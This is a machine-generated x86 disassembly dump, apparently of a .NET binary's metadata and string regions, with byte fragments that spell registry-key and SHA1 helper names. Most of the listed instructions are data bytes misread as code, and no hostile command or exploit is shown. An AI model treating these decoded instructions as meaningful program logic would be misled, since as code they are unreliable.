  4057f3:	00 f8                	add    %bh,%al
  4057f5:	0c 00                	or     $0x0,%al
  4057f7:	00 01                	add    %al,(%ecx)
  4057f9:	00 f8                	add    %bh,%al
  4057fb:	0c 00                	or     $0x0,%al
  4057fd:	00 01                	add    %al,(%ecx)
  4057ff:	00 f8                	add    %bh,%al
  405801:	0c 00                	or     $0x0,%al
  405803:	00 01                	add    %al,(%ecx)
  405805:	00 f8                	add    %bh,%al
  405807:	0c 00                	or     $0x0,%al
  405809:	00 01                	add    %al,(%ecx)
  40580b:	00 f8                	add    %bh,%al
  40580d:	0c 00                	or     $0x0,%al
  40580f:	00 01                	add    %al,(%ecx)
  405811:	00 61 0c             	add    %ah,0xc(%ecx)
  405814:	00 00                	add    %al,(%eax)
  405816:	01 00                	add    %eax,(%eax)
  405818:	ad                   	lods   %ds:(%esi),%eax
  405819:	08 00                	or     %al,(%eax)
  40581b:	00 02                	add    %al,(%edx)
  40581d:	00 f8                	add    %bh,%al
  40581f:	0c 00                	or     $0x0,%al
  405821:	00 01                	add    %al,(%ecx)
  405823:	00 f8                	add    %bh,%al
  405825:	0c 00                	or     $0x0,%al
  405827:	00 01                	add    %al,(%ecx)
  405829:	00 3f                	add    %bh,(%edi)
  40582b:	04 00                	add    $0x0,%al
  40582d:	00 02                	add    %al,(%edx)
  40582f:	00 f8                	add    %bh,%al
  405831:	0c 00                	or     $0x0,%al
  405833:	00 01                	add    %al,(%ecx)
  405835:	00 9f 0e 00 00 02    	add    %bl,0x200000e(%edi)
  40583b:	00 8a 0e 00 00 03    	add    %cl,0x300000e(%edx)
  405841:	00 a3 0c 00 00 04    	add    %ah,0x400000c(%ebx)
  405847:	00 f8                	add    %bh,%al
  405849:	02 02                	add    (%edx),%al
  40584b:	00 05 00 77 0d 00    	add    %al,0xd7700
  405851:	00 01                	add    %al,(%ecx)
  405853:	00 9f 0e 00 00 01    	add    %bl,0x100000e(%edi)
  405859:	00 9f 0e 00 00 02    	add    %bl,0x200000e(%edi)
  40585f:	00 92 04 00 00 03    	add    %dl,0x3000004(%edx)
  405865:	00 03                	add    %al,(%ebx)
  405867:	03 00                	add    (%eax),%eax
  405869:	00 04 00             	add    %al,(%eax,%eax,1)
  40586c:	0d 05 00 00 05       	or     $0x5000005,%eax
  405871:	00 69 02             	add    %ch,0x2(%ecx)
  405874:	00 00                	add    %al,(%eax)
  405876:	06                   	push   %es
  405877:	00 60 02             	add    %ah,0x2(%eax)
  40587a:	00 00                	add    %al,(%eax)
  40587c:	01 00                	add    %eax,(%eax)
  40587e:	81 07 00 00 02 00    	addl   $0x20000,(%edi)
  405884:	d6                   	salc
  405885:	04 00                	add    $0x0,%al
  405887:	00 03                	add    %al,(%ebx)
  405889:	00 e0                	add    %ah,%al
  40588b:	04 00                	add    $0x0,%al
  40588d:	00 01                	add    %al,(%ecx)
  40588f:	00 81 07 00 00 02    	add    %al,0x2000007(%ecx)
  405895:	00 d6                	add    %dl,%dh
  405897:	04 00                	add    $0x0,%al
  405899:	00 03                	add    %al,(%ebx)
  40589b:	00 e0                	add    %ah,%al
  40589d:	04 00                	add    $0x0,%al
  40589f:	00 01                	add    %al,(%ecx)
  4058a1:	00 81 07 00 00 02    	add    %al,0x2000007(%ecx)
  4058a7:	00 d6                	add    %dl,%dh
  4058a9:	04 00                	add    $0x0,%al
  4058ab:	00 03                	add    %al,(%ebx)
  4058ad:	00 b0 0e 00 00 04    	add    %dh,0x400000e(%eax)
  4058b3:	00 e0                	add    %ah,%al
  4058b5:	04 00                	add    $0x0,%al
  4058b7:	00 01                	add    %al,(%ecx)
  4058b9:	00 51 02             	add    %dl,0x2(%ecx)
  4058bc:	0c 00                	or     $0x0,%al
  4058be:	40                   	inc    %eax
  4058bf:	00 0d 00 40 00 0e    	add    %cl,0xe004000
  4058c5:	00 40 00             	add    %al,0x0(%eax)
  4058c8:	0f 00 40 00          	sldt   0x0(%eax)
  4058cc:	11 00                	adc    %eax,(%eax)
  4058ce:	40                   	inc    %eax
  4058cf:	00 12                	add    %dl,(%edx)
  4058d1:	00 40 00             	add    %al,0x0(%eax)
  4058d4:	09 00                	or     %eax,(%eax)
  4058d6:	64 0b 01             	or     %fs:(%ecx),%eax
  4058d9:	00 11                	add    %dl,(%ecx)
  4058db:	00 64 0b 06          	add    %ah,0x6(%ebx,%ecx,1)
  4058df:	00 19                	add    %bl,(%ecx)
  4058e1:	00 64 0b 0a          	add    %ah,0xa(%ebx,%ecx,1)
  4058e5:	00 29                	add    %ch,(%ecx)
  4058e7:	00 64 0b 10          	add    %ah,0x10(%ebx,%ecx,1)
  4058eb:	00 31                	add    %dh,(%ecx)
  4058ed:	00 64 0b 10          	add    %ah,0x10(%ebx,%ecx,1)
  4058f1:	00 39                	add    %bh,(%ecx)
  4058f3:	00 64 0b 10          	add    %ah,0x10(%ebx,%ecx,1)
  4058f7:	00 41 00             	add    %al,0x0(%ecx)
  4058fa:	64 0b 10             	or     %fs:(%eax),%edx
  4058fd:	00 49 00             	add    %cl,0x0(%ecx)
  405900:	64 0b 10             	or     %fs:(%eax),%edx
  405903:	00 51 00             	add    %dl,0x0(%ecx)
  405906:	64 0b 10             	or     %fs:(%eax),%edx
  405909:	00 59 00             	add    %bl,0x0(%ecx)
  40590c:	64 0b 10             	or     %fs:(%eax),%edx
  40590f:	00 61 00             	add    %ah,0x0(%ecx)
  405912:	64 0b 15 00 69 00 64 	or     %fs:0x64006900,%edx
  405919:	0b 10                	or     (%eax),%edx
  40591b:	00 71 00             	add    %dh,0x0(%ecx)
  40591e:	64 0b 10             	or     %fs:(%eax),%edx
  405921:	00 79 00             	add    %bh,0x0(%ecx)
  405924:	64 0b 10             	or     %fs:(%eax),%edx
  405927:	00 f9                	add    %bh,%cl
  405929:	00 64 0b 06          	add    %ah,0x6(%ebx,%ecx,1)
  40592d:	00 09                	add    %cl,(%ecx)
  40592f:	01 64 0b 1a          	add    %esp,0x1a(%ebx,%ecx,1)
  405933:	00 91 00 64 0b 06    	add    %dl,0x60b6400(%ecx)
  405939:	00 a1 00 64 0b 06    	add    %ah,0x60b6400(%ecx)
  40593f:	00 a1 00 f8 04 30    	add    %ah,0x3004f800(%ecx)
  405945:	00 81 00 0e 08 36    	add    %al,0x36080e00(%ecx)
  40594b:	00 19                	add    %bl,(%ecx)
  40594d:	01 3a                	add    %edi,(%edx)
  40594f:	0d 3a 00 21 01       	or     $0x121003a,%eax
  405954:	0e                   	push   %cs
  405955:	08 36                	or     %dh,(%esi)
  405957:	00 19                	add    %bl,(%ecx)
  405959:	01 3a                	add    %edi,(%edx)
  40595b:	0d 41 00 29 01       	or     $0x1290041,%eax
  405960:	20 0e                	and    %cl,(%esi)
  405962:	10 00                	adc    %al,(%eax)
  405964:	89 00                	mov    %eax,(%eax)
  405966:	e9 0a 47 00 91       	jmp    0x9140a075
  40596b:	00 a8 02 4c 00 91    	add    %ch,-0x6effb3fe(%eax)
  405971:	00 20                	add    %ah,(%eax)
  405973:	0d 53 00 39 01       	or     $0x1390053,%eax
  405978:	10 09                	adc    %cl,(%ecx)
  40597a:	59                   	pop    %ecx
  40597b:	00 41 01             	add    %al,0x1(%ecx)
  40597e:	10 09                	adc    %cl,(%ecx)
  405980:	60                   	pusha
  405981:	00 51 01             	add    %dl,0x1(%ecx)
  405984:	03 05 65 00 59 01    	add    0x1590065,%eax
  40598a:	26 05 06 00 51 01    	es add $0x1510006,%eax
  405990:	03 05 6a 00 b1 00    	add    0xb1006a,%eax
  405996:	bd 03 36 00 19       	mov    $0x19003603,%ebp
  40599b:	01 3a                	add    %edi,(%edx)
  40599d:	0d 70 00 19 01       	or     $0x1190070,%eax
  4059a2:	48                   	dec    %eax
  4059a3:	0f 8f 00 49 01 0e    	jg     0xe41a2a9
  4059a9:	08 36                	or     %dh,(%esi)
  4059ab:	00 81 00 64 0b 06    	add    %al,0x60b6400(%ecx)
  4059b1:	00 b9 00 64 0b 06    	add    %bh,0x60b6400(%ecx)
  4059b7:	00 19                	add    %bl,(%ecx)
  4059b9:	01 87 0c b6 00 61    	add    %eax,0x6100b60c(%edi)
  4059bf:	01 f0                	add    %esi,%eax
  4059c1:	07                   	pop    %es
  4059c2:	10 00                	adc    %al,(%eax)
  4059c4:	61                   	popa
  4059c5:	01 53 09             	add    %edx,0x9(%ebx)
  4059c8:	06                   	push   %es
  4059c9:	00 59 01             	add    %bl,0x1(%ecx)
  4059cc:	a3 02 c4 00 59       	mov    %eax,0x5900c402
  4059d1:	01 c7                	add    %eax,%edi
  4059d3:	08 c8                	or     %cl,%al
  4059d5:	00 59 01             	add    %bl,0x1(%ecx)
  4059d8:	5c                   	pop    %esp
  4059d9:	07                   	pop    %es
  4059da:	60                   	pusha
  4059db:	00 69 01             	add    %ch,0x1(%ecx)
  4059de:	61                   	popa
  4059df:	04 cd                	add    $0xcd,%al
  4059e1:	00 51 01             	add    %dl,0x1(%ecx)
  4059e4:	03 05 d1 00 59 01    	add    0x15900d1,%eax
  4059ea:	f4                   	hlt
  4059eb:	0d e3 00 51 01       	or     $0x15100e3,%eax
  4059f0:	03 05 e7 00 71 01    	add    0x17100e7,%eax
  4059f6:	5c                   	pop    %esp
  4059f7:	07                   	pop    %es
  4059f8:	f5                   	cmc
  4059f9:	00 79 01             	add    %bh,0x1(%ecx)
  4059fc:	55                   	push   %ebp
  4059fd:	04 00                	add    $0x0,%al
  4059ff:	01 81 01 a8 03 00    	add    %eax,0x3a801(%ecx)
  405a05:	01 89 01 64 0b 10    	add    %ecx,0x100b6401(%ecx)
  405a0b:	00 89 01 95 08 05    	add    %cl,0x5089501(%ecx)
  405a11:	01 91 01 e0 0e 0f    	add    %edx,0xf0ee001(%ecx)
  405a17:	01 c1                	add    %eax,%ecx
  405a19:	00 64 0b 1e          	add    %ah,0x1e(%ebx,%ecx,1)
  405a1d:	01 c9                	add    %ecx,%ecx
  405a1f:	00 64 0b 06          	add    %ah,0x6(%ebx,%ecx,1)
  405a23:	00 b1 01 68 08 2c    	add    %dh,0x2c086801(%ecx)
  405a29:	01 c1                	add    %eax,%ecx
  405a2b:	01 d3                	add    %edx,%ebx
  405a2d:	07                   	pop    %es
  405a2e:	34 01                	xor    $0x1,%al
  405a30:	d1 00                	roll   $1,(%eax)
  405a32:	64 0b 06             	or     %fs:(%esi),%eax
  405a35:	00 19                	add    %bl,(%ecx)
  405a37:	01 95 08 e3 00 51    	add    %edx,0x5100e308(%ebp)
  405a3d:	01 03                	add    %eax,(%ebx)
  405a3f:	05 4d 01 19 01       	add    $0x119014d,%eax
  405a44:	1a 0f                	sbb    (%edi),%cl
  405a46:	5e                   	pop    %esi
  405a47:	01 19                	add    %ebx,(%ecx)
  405a49:	01 3a                	add    %edi,(%edx)
  405a4b:	0d 6e 01 a9 00       	or     $0xa9016e,%eax
  405a50:	15 03 76 01 69       	adc    $0x69017603,%eax
  405a55:	01 0a                	add    %ecx,(%edx)
  405a57:	0c 00                	or     $0x0,%al
  405a59:	01 c9                	add    %ecx,%ecx
  405a5b:	01 04 0f             	add    %eax,(%edi,%ecx,1)
  405a5e:	81 01 d1 01 c9 04    	addl   $0x4c901d1,(%ecx)
  405a64:	36 00 19             	add    %bl,%ss:(%ecx)
  405a67:	01 17                	add    %edx,(%edi)
  405a69:	08 a2 01 c1 01 78    	or     %ah,0x7801c101(%edx)
  405a6f:	00 a8 01 d9 01 0e    	add    %ch,0xe01d901(%eax)
  405a75:	08 36                	or     %dh,(%esi)
  405a77:	00 19                	add    %bl,(%ecx)
  405a79:	01 59 0e             	add    %ebx,0xe(%ecx)
  405a7c:	b4 01                	mov    $0x1,%ah
  405a7e:	e1 01                	loope  0x405a81
  405a80:	3a 05 b9 01 19 01    	cmp    0x11901b9,%al
  405a86:	64 0b c0             	fs or  %eax,%eax
  405a89:	01 51 01             	add    %edx,0x1(%ecx)
  405a8c:	03 05 eb 01 0c 00    	add    0xc01eb,%eax
  405a92:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405a93:	0e                   	push   %cs
  405a94:	11 02                	adc    %eax,(%edx)
  405a96:	0c 00                	or     $0x0,%al
  405a98:	10 09                	adc    %cl,(%ecx)
  405a9a:	17                   	pop    %ss
  405a9b:	02 89 00 64 0b 06    	add    0x60b6400(%ecx),%cl
  405aa1:	00 89 00 d4 09 1e    	add    %cl,0x1e09d400(%ecx)
  405aa7:	02 19                	add    (%ecx),%bl
  405aa9:	01 26                	add    %esp,(%esi)
  405aab:	0f 5e 01             	divps  (%ecx),%xmm0
  405aae:	0c 00                	or     $0x0,%al
  405ab0:	64 0b 06             	or     %fs:(%esi),%eax
  405ab3:	00 14 00             	add    %dl,(%eax,%eax,1)
  405ab6:	56                   	push   %esi
  405ab7:	0b 7e 02             	or     0x2(%esi),%edi
  405aba:	1c 00                	sbb    $0x0,%al
  405abc:	e8 0d 8d 02 19       	call   0x1942e7ce
  405ac1:	01 a4 07 92 02 19 01 	add    %esp,0x1190292(%edi,%eax,1)
  405ac8:	17                   	pop    %ss
  405ac9:	08 97 02 0c 00 19    	or     %dl,0x19000c02(%edi)
  405acf:	09 9c 02 f1 01 0b 0e 	or     %ebx,0xe0b01f1(%edx,%eax,1)
  405ad6:	c4 00                	les    (%eax),%eax
  405ad8:	f9                   	stc
  405ad9:	01 2c 05 06 00 01 02 	add    %ebp,0x2010006(,%eax,1)
  405ae0:	03 05 65 00 24 00    	add    0x240065,%eax
  405ae6:	64 0b 06             	or     %fs:(%esi),%eax
  405ae9:	00 2c 00             	add    %ch,(%eax,%eax,1)
  405aec:	64 0b b9 02 24 00 cb 	or     %fs:-0x34ffdbfe(%ecx),%edi
  405af3:	02 9c 02 19 01 40 0f 	add    0xf400119(%edx,%eax,1),%bl
  405afa:	c7 02 24 00 a4 0e    	movl   $0xea40024,(%edx)
  405b00:	11 02                	adc    %eax,(%edx)
  405b02:	24 00                	and    $0x0,%al
  405b04:	10 09                	adc    %cl,(%ecx)
  405b06:	17                   	pop    %ss
  405b07:	02 2c 00             	add    (%eax,%eax,1),%ch
  405b0a:	c9                   	leave
  405b0b:	03 8d 02 09 02 64    	add    0x64020902(%ebp),%ecx
  405b11:	0b d0                	or     %eax,%edx
  405b13:	02 a1 00 64 0b 01    	add    0x10b6400(%ecx),%ah
  405b19:	00 11                	add    %dl,(%ecx)
  405b1b:	02 e1                	add    %cl,%ah
  405b1d:	01 e5                	add    %esp,%ebp
  405b1f:	02 11                	add    (%ecx),%dl
  405b21:	02 25 0c eb 02 19    	add    0x1902eb0c,%ah
  405b27:	02 44 09 f7          	add    -0x9(%ecx,%ecx,1),%al
  405b2b:	02 19                	add    (%ecx),%bl
  405b2d:	02 0e                	add    (%esi),%cl
  405b2f:	08 34 01             	or     %dh,(%ecx,%eax,1)
  405b32:	19 01                	sbb    %eax,(%ecx)
  405b34:	85 03                	test   %eax,(%ebx)
  405b36:	fa                   	cli
  405b37:	02 08                	add    (%eax),%cl
  405b39:	00 90 00 12 03 08    	add    %dl,0x8031200(%eax)
  405b3f:	00 94 00 17 03 08 00 	add    %dl,0x80317(%eax,%eax,1)
  405b46:	98                   	cwtl
  405b47:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  405b4a:	08 00                	or     %al,(%eax)
  405b4c:	9c                   	pushf
  405b4d:	00 21                	add    %ah,(%ecx)
  405b4f:	03 08                	add    (%eax),%ecx
  405b51:	00 a0 00 26 03 08    	add    %ah,0x8032600(%eax)
  405b57:	00 a4 00 2b 03 08 00 	add    %ah,0x8032b(%eax,%eax,1)
  405b5e:	a8 00                	test   $0x0,%al
  405b60:	30 03                	xor    %al,(%ebx)
  405b62:	08 00                	or     %al,(%eax)
  405b64:	ac                   	lods   %ds:(%esi),%al
  405b65:	00 35 03 08 00 b0    	add    %dh,0xb0000803
  405b6b:	00 3a                	add    %bh,(%edx)
  405b6d:	03 08                	add    (%eax),%ecx
  405b6f:	00 b4 00 3f 03 08 00 	add    %dh,0x8033f(%eax,%eax,1)
  405b76:	b8 00 44 03 08       	mov    $0x8034400,%eax
  405b7b:	00 bc 00 3f 03 08 00 	add    %bh,0x8033f(%eax,%eax,1)
  405b82:	c0 00 49             	rolb   $0x49,(%eax)
  405b85:	03 2e                	add    (%esi),%ebp
  405b87:	00 0b                	add    %cl,(%ebx)
  405b89:	00 4e 04             	add    %cl,0x4(%esi)
  405b8c:	2e 00 13             	add    %dl,%cs:(%ebx)
  405b8f:	00 57 04             	add    %dl,0x4(%edi)
  405b92:	2e 00 1b             	add    %bl,%cs:(%ebx)
  405b95:	00 76 04             	add    %dh,0x4(%esi)
  405b98:	2e 00 23             	add    %ah,%cs:(%ebx)
  405b9b:	00 7f 04             	add    %bh,0x4(%edi)
  405b9e:	2e 00 2b             	add    %ch,%cs:(%ebx)
  405ba1:	00 8e 04 2e 00 33    	add    %cl,0x33002e04(%esi)
  405ba7:	00 8e 04 2e 00 3b    	add    %cl,0x3b002e04(%esi)
  405bad:	00 8e 04 2e 00 43    	add    %cl,0x43002e04(%esi)
  405bb3:	00 7f 04             	add    %bh,0x4(%edi)
  405bb6:	2e 00 4b 00          	add    %cl,%cs:0x0(%ebx)
  405bba:	94                   	xchg   %eax,%esp
  405bbb:	04 2e                	add    $0x2e,%al
  405bbd:	00 53 00             	add    %dl,0x0(%ebx)
  405bc0:	8e 04 2e             	mov    (%esi,%ebp,1),%es
  405bc3:	00 5b 00             	add    %bl,0x0(%ebx)
  405bc6:	8e 04 2e             	mov    (%esi,%ebp,1),%es
  405bc9:	00 63 00             	add    %ah,0x0(%ebx)
  405bcc:	ac                   	lods   %ds:(%esi),%al
  405bcd:	04 2e                	add    $0x2e,%al
  405bcf:	00 6b 00             	add    %ch,0x0(%ebx)
  405bd2:	d6                   	salc
  405bd3:	04 2e                	add    $0x2e,%al
  405bd5:	00 73 00             	add    %dh,0x0(%ebx)
  405bd8:	e3 04                	jecxz  0x405bde
  405bda:	43                   	inc    %ebx
  405bdb:	03 7b 00             	add    0x0(%ebx),%edi
  405bde:	12 03                	adc    (%ebx),%al
  405be0:	01 04 7b             	add    %eax,(%ebx,%edi,2)
  405be3:	00 12                	add    %dl,(%edx)
  405be5:	03 01                	add    (%ecx),%eax
  405be7:	04 83                	add    $0x83,%al
  405be9:	00 2d 05 21 04 7b    	add    %ch,0x7b042105
  405bef:	00 12                	add    %dl,(%edx)
  405bf1:	03 21                	add    (%ecx),%esp
  405bf3:	04 83                	add    $0x83,%al
  405bf5:	00 2d 05 c0 08 7b    	add    %ch,0x7b08c005
  405bfb:	00 12                	add    %dl,(%edx)
  405bfd:	03 e0                	add    %eax,%esp
  405bff:	08 7b 00             	or     %bh,0x0(%ebx)
  405c02:	12 03                	adc    (%ebx),%al
  405c04:	21 00                	and    %eax,(%eax)
  405c06:	76 00                	jbe    0x405c08
  405c08:	82 00 92             	addb   $0x92,(%eax)
  405c0b:	00 9c 00 ab 00 bb 00 	add    %bl,0xbb00ab(%eax,%eax,1)
  405c12:	d9 00                	flds   (%eax)
  405c14:	ee                   	out    %al,(%dx)
  405c15:	00 8f 00 fc 00 09    	add    %cl,0x900fc00(%edi)
  405c1b:	01 16                	add    %edx,(%esi)
  405c1d:	01 3a                	add    %edi,(%edx)
  405c1f:	01 42 01             	add    %eax,0x1(%edx)
  405c22:	54                   	push   %esp
  405c23:	01 64 01 7b          	add    %esp,0x7b(%ecx,%eax,1)
  405c27:	01 88 01 91 01 98    	add    %ecx,-0x67fe6eff(%eax)
  405c2d:	01 ae 01 c6 01 d0    	add    %ebp,-0x2ffe39ff(%esi)
  405c33:	01 e4                	add    %esp,%esp
  405c35:	01 f0                	add    %esi,%eax
  405c37:	01 f7                	add    %esi,%edi
  405c39:	01 24 02             	add    %esp,(%edx,%eax,1)
  405c3c:	2f                   	das
  405c3d:	02 49 02             	add    0x2(%ecx),%cl
  405c40:	5d                   	pop    %ebp
  405c41:	02 62 02             	add    0x2(%edx),%ah
  405c44:	bf 02 cc 02 d5       	mov    $0xd502cc02,%edi
  405c49:	02 f1                	add    %cl,%dh
  405c4b:	02 0c 00             	add    (%eax,%eax,1),%cl
  405c4e:	01 00                	add    %eax,(%eax)
  405c50:	0d 00 02 00 0e       	or     $0xe000200,%eax
  405c55:	00 03                	add    %al,(%ebx)
  405c57:	00 0f                	add    %cl,(%edi)
  405c59:	00 04 00             	add    %al,(%eax,%eax,1)
  405c5c:	11 00                	adc    %eax,(%eax)
  405c5e:	05 00 12 00 06       	add    $0x6001200,%eax
  405c63:	00 14 00             	add    %dl,(%eax,%eax,1)
  405c66:	07                   	pop    %es
  405c67:	00 00                	add    %al,(%eax)
  405c69:	00 33                	add    %dh,(%ebx)
  405c6b:	04 3d                	add    $0x3d,%al
  405c6d:	04 00                	add    $0x0,%al
  405c6f:	00 33                	add    %dh,(%ebx)
  405c71:	04 3d                	add    $0x3d,%al
  405c73:	04 00                	add    $0x0,%al
  405c75:	00 33                	add    %dh,(%ebx)
  405c77:	04 3d                	add    $0x3d,%al
  405c79:	04 00                	add    $0x0,%al
  405c7b:	00 33                	add    %dh,(%ebx)
  405c7d:	04 3d                	add    $0x3d,%al
  405c7f:	04 00                	add    $0x0,%al
  405c81:	00 33                	add    %dh,(%ebx)
  405c83:	04 3d                	add    $0x3d,%al
  405c85:	04 00                	add    $0x0,%al
  405c87:	00 33                	add    %dh,(%ebx)
  405c89:	04 3d                	add    $0x3d,%al
  405c8b:	04 00                	add    $0x0,%al
  405c8d:	00 a4 08 41 04 00 00 	add    %ah,0x441(%eax,%ecx,1)
  405c94:	ee                   	out    %al,(%dx)
  405c95:	0c 45                	or     $0x45,%al
  405c97:	04 02                	add    $0x2,%al
  405c99:	00 31                	add    %dh,(%ecx)
  405c9b:	00 03                	add    %al,(%ebx)
  405c9d:	00 02                	add    %al,(%edx)
  405c9f:	00 34 00             	add    %dh,(%eax,%eax,1)
  405ca2:	05 00 02 00 37       	add    $0x37000200,%eax
  405ca7:	00 07                	add    %al,(%edi)
  405ca9:	00 02                	add    %al,(%edx)
  405cab:	00 3b                	add    %bh,(%ebx)
  405cad:	00 09                	add    %cl,(%ecx)
  405caf:	00 02                	add    %al,(%edx)
  405cb1:	00 3f                	add    %bh,(%edi)
  405cb3:	00 0b                	add    %cl,(%ebx)
  405cb5:	00 02                	add    %al,(%edx)
  405cb7:	00 42 00             	add    %al,0x0(%edx)
  405cba:	0d 00 02 00 46       	or     $0x46000200,%eax
  405cbf:	00 0f                	add    %cl,(%edi)
  405cc1:	00 02                	add    %al,(%edx)
  405cc3:	00 47 00             	add    %al,0x0(%edi)
  405cc6:	11 00                	adc    %eax,(%eax)
  405cc8:	d2 08                	rorb   %cl,(%eax)
  405cca:	df 08                	fisttps (%eax)
  405ccc:	0a 02                	or     (%edx),%al
  405cce:	78 02                	js     0x405cd2
  405cd0:	87 02                	xchg   %eax,(%edx)
  405cd2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405cd3:	02 b1 02 00 01 a1    	add    -0x5efefffe(%ecx),%dh
  405cd9:	00 48 0e             	add    %cl,0xe(%eax)
  405cdc:	01 00                	add    %eax,(%eax)
  405cde:	00 01                	add    %al,(%ecx)
  405ce0:	a3 00 93 0e 01       	mov    %eax,0x10e9300
  405ce5:	00 00                	add    %al,(%eax)
  405ce7:	01 a5 00 38 0e 02    	add    %esp,0x20e3800(%ebp)
  405ced:	00 04 80             	add    %al,(%eax,%eax,4)
  405cf0:	00 00                	add    %al,(%eax)
  405cf2:	01 00                	add    %eax,(%eax)
	...
  405d00:	3f                   	aas
  405d01:	02 00                	add    (%eax),%al
  405d03:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  405d0e:	00 00                	add    %al,(%eax)
  405d10:	00 03                	add    %al,(%ebx)
  405d12:	7b 02                	jnp    0x405d16
  405d14:	00 00                	add    %al,(%eax)
  405d16:	00 00                	add    %al,(%eax)
  405d18:	04 00                	add    $0x0,%al
	...
  405d22:	00 00                	add    %al,(%eax)
  405d24:	00 03                	add    %al,(%ebx)
  405d26:	54                   	push   %esp
  405d27:	02 00                	add    (%eax),%al
  405d29:	00 00                	add    %al,(%eax)
  405d2b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  405d36:	00 00                	add    %al,(%eax)
  405d38:	09 03                	or     %eax,(%ebx)
  405d3a:	70 02                	jo     0x405d3e
  405d3c:	00 00                	add    %al,(%eax)
  405d3e:	00 00                	add    %al,(%eax)
  405d40:	04 00                	add    $0x0,%al
	...
  405d4a:	00 00                	add    %al,(%eax)
  405d4c:	00 03                	add    %al,(%ebx)
  405d4e:	22 09                	and    (%ecx),%cl
  405d50:	00 00                	add    %al,(%eax)
  405d52:	00 00                	add    %al,(%eax)
  405d54:	17                   	pop    %ss
  405d55:	00 08                	add    %cl,(%eax)
  405d57:	00 18                	add    %bl,(%eax)
  405d59:	00 08                	add    %cl,(%eax)
  405d5b:	00 19                	add    %bl,(%ecx)
  405d5d:	00 08                	add    %cl,(%eax)
  405d5f:	00 1a                	add    %bl,(%edx)
  405d61:	00 15 00 00 00 00    	add    %dl,0x0
  405d67:	00 00                	add    %al,(%eax)
  405d69:	3c 3e                	cmp    $0x3e,%al
  405d6b:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  405d6e:	31 5f 30             	xor    %ebx,0x30(%edi)
  405d71:	00 3c 2e             	add    %bh,(%esi,%ebp,1)
  405d74:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  405d78:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  405d7c:	31 5f 30             	xor    %ebx,0x30(%edi)
  405d7f:	00 73 53             	add    %dh,0x53(%ebx)
  405d82:	48                   	dec    %eax
  405d83:	41                   	inc    %ecx
  405d84:	31 00                	xor    %eax,(%eax)
  405d86:	3c 3e                	cmp    $0x3e,%al
  405d88:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  405d8b:	31 5f 31             	xor    %ebx,0x31(%edi)
  405d8e:	00 3c 2e             	add    %bh,(%esi,%ebp,1)
  405d91:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  405d95:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  405d99:	31 5f 31             	xor    %ebx,0x31(%edi)
  405d9c:	00 46 75             	add    %al,0x75(%esi)
  405d9f:	6e                   	outsb  %ds:(%esi),(%dx)
  405da0:	63 60 31             	arpl   %esp,0x31(%eax)
  405da3:	00 49 45             	add    %cl,0x45(%ecx)
  405da6:	6e                   	outsb  %ds:(%esi),(%dx)
  405da7:	75 6d                	jne    0x405e16
  405da9:	65 72 61             	gs jb  0x405e0d
  405dac:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  405db0:	31 00                	xor    %eax,(%eax)
  405db2:	49                   	dec    %ecx
  405db3:	45                   	inc    %ebp
  405db4:	6e                   	outsb  %ds:(%esi),(%dx)
  405db5:	75 6d                	jne    0x405e24
  405db7:	65 72 61             	gs jb  0x405e1b
  405dba:	74 6f                	je     0x405e2b
  405dbc:	72 60                	jb     0x405e1e
  405dbe:	31 00                	xor    %eax,(%eax)
  405dc0:	52                   	push   %edx
  405dc1:	65 67 69 73 74 72 79 	imul   $0x4f577972,%gs:0x74(%bp,%di),%esi
  405dc8:	57 4f 
  405dca:	57                   	push   %edi
  405dcb:	36 34 33             	ss xor $0x33,%al
  405dce:	32 00                	xor    (%eax),%al
  405dd0:	4d                   	dec    %ebp
  405dd1:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  405dd8:	74 2e                	je     0x405e08
  405dda:	57                   	push   %edi
  405ddb:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  405de2:	49                   	dec    %ecx
  405de3:	6e                   	outsb  %ds:(%esi),(%dx)
  405de4:	74 33                	je     0x405e19
  405de6:	32 00                	xor    (%eax),%al
  405de8:	47                   	inc    %edi
  405de9:	65 74 52             	gs je  0x405e3e
  405dec:	65 67 4b             	gs addr16 dec %ebx
  405def:	65 79 33             	gs jns 0x405e25
  405df2:	32 00                	xor    (%eax),%al
  405df4:	3c 3e                	cmp    $0x3e,%al
  405df6:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  405df9:	31 5f 32             	xor    %ebx,0x32(%edi)
  405dfc:	00 3c 2e             	add    %bh,(%esi,%ebp,1)
  405dff:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  405e03:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  405e07:	31 5f 32             	xor    %ebx,0x32(%edi)
  405e0a:	00 44 69 63          	add    %al,0x63(%ecx,%ebp,2)
  405e0e:	74 69                	je     0x405e79
  405e10:	6f                   	outsl  %ds:(%esi),(%dx)
  405e11:	6e                   	outsb  %ds:(%esi),(%dx)
  405e12:	61                   	popa
  405e13:	72 79                	jb     0x405e8e
  405e15:	60                   	pusha
  405e16:	32 00                	xor    (%eax),%al
  405e18:	3c 3e                	cmp    $0x3e,%al
  405e1a:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  405e1d:	31 5f 33             	xor    %ebx,0x33(%edi)
  405e20:	00 3c 2e             	add    %bh,(%esi,%ebp,1)
  405e23:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  405e27:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  405e2b:	31 5f 33             	xor    %ebx,0x33(%edi)
  405e2e:	00 49 6e             	add    %cl,0x6e(%ecx)
  405e31:	74 36                	je     0x405e69
  405e33:	34 00                	xor    $0x0,%al
  405e35:	47                   	inc    %edi
  405e36:	65 74 52             	gs je  0x405e8b
  405e39:	65 67 4b             	gs addr16 dec %ebx
  405e3c:	65 79 36             	gs jns 0x405e75
